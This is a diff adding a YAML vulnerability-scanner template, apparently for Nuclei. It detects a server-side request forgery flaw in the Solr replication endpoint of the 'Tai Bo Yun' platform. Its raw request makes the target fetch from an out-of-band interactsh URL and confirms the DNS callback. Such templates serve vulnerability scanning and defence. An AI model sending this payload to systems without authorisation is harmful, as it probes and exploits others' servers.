@@ -1,0 +1,33 @@
+id: poc-yaml-tai-bo-yun-solr-ssrf
+info:
+  name: Tai Bo Yun Platform Solr SSRF Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: dnslog,ssrf
+
+variables:
+  reverse: '{{interactsh-url}}'
+
+http:
+  - raw:
+      - |
+        GET /solr/collection1/replication/?command=fetchindex&masterUrl=http://{{reverse}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '<str name="status">OK</str>'
+      - type: word
+        part: header
+        words:
+          - "application/xml"
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
